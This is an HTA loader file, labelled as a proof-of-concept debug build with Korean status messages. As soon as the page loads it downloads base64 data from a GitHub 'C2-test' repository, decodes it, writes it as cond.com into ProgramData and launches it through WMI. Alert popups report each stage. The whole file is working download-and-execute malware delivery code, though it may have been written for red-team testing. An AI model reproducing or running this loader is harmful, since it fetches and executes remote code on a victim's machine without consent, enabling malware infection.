<html>
  <head>
    <title>PoC Loader Debug</title>
    <hta:application
      id="pocLoaderDebug"
      showintaskbar="yes"
      sysmenu="yes"
      windowstate="normal"
    />
    <script language="JScript">
      function runPayload() {
        try {
          // 1. GitHub 다운로드 체크
          var url =
            "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/payload/encoded_encrypt.txt";
          var xmlHttp = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");

          xmlHttp.open("GET", url, false);
          xmlHttp.send();

          if (xmlHttp.status !== 200) {
            alert(
              "[-] GitHub 다운로드 실패! HTTP 상태 코드: " + xmlHttp.status,
            );
            window.close();
            return;
          }

          var base64Data = xmlHttp.responseText;
          if (!base64Data || base64Data.length === 0) {
            alert("[-] 다운로드된 텍스트가 비어 있습니다.");
            window.close();
            return;
          }
          alert(
            "[+] 1단계 성공: GitHub에서 Base64 데이터 수신 완료 (" +
              base64Data.length +
              " 바이트)",
          );

          // 2. Base64 디코딩 체크
          var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
          var el = xmlDoc.createElement("tmp");
          el.dataType = "bin.base64";
          el.text = base64Data;
          var decodedBytes = el.nodeTypedValue;
          alert("[+] 2단계 성공: Base64 디코딩 완료");

          // 3. 파일 생성 경로 및 권한 체크
          var shell = new ActiveXObject("WScript.Shell");
          var programDataPath = shell.ExpandEnvironmentStrings(
            "%SystemDrive%\\ProgramData",
          );
          var targetPath = programDataPath + "\\cond.com";
          alert("[*] 파일 생성 시도 경로: " + targetPath);

          var stream = new ActiveXObject("ADODB.Stream");
          stream.type = 1; // Binary
          stream.open();
          stream.write(decodedBytes);
          stream.saveToFile(targetPath, 2); // 2: Overwrite
          stream.close();
          alert("[+] 3단계 성공: ProgramData에 파일 쓰기 완료");

          // 4. WMI 실행 체크
          var wmiService = GetObject(
            "winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2",
          );
          var processInfo = wmiService.Get("Win32_Process");

          var processId = 0;
          var result = processInfo.Create(targetPath, null, null, processId);

          if (result === 0) {
            alert("[+] 4단계 성공: WMI 프로세스 생성 완료! PID: " + processId);
          } else {
            alert("[-] 4단계 실패: WMI 응답 코드: " + result);
          }
        } catch (e) {
          // 에러 발생 시 팝업 창으로 세부 내용 출력
          alert(
            "[-] 예외 에러 발생:\n이름: " + e.name + "\n메시지: " + e.message,
          );
        } finally {
          // 디버깅을 위해 자동 종료를 임시 주석 처리합니다.
          // 확인이 끝나면 주석을 해제하세요.
          // window.close();
        }
      }
    </script>
  </head>
  <body onload="runPayload()">
    <h3>PoC 디버깅 모드 작동 중...</h3>
  </body>
</html>
